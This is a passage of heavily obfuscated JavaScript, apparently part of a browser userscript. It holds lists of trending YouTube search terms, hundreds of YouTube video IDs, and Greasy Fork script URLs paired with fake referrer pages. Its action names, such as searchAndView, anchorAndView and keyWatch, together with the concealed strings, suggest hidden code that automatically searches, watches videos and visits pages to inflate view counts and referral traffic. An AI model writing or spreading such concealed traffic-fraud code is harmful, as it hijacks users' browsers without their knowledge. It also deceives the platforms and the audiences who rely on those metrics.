'\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + T(0x6, 'v3sS') + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1f3 * 0xd + -0x991 + -0x4c * 0x35)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x12e2 * -0x2 + 0x1 * 0xc1d + 0x31d7 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * -0x14bb + -0xc * 0x2ab + 0x1196 * 0x3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    T(0x17, '2a^Y') + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    T(0x1b, 'dnrA') + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    U(0xd) + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    T(0xc, 'oWy!') + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    U(0x4) + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    T(0x7, '2f5e') + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    V(0xf) + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    V(0x15) + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + V(0x1a),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x5) + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + U(0xb) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + V(0x13) + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + V(0x10) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
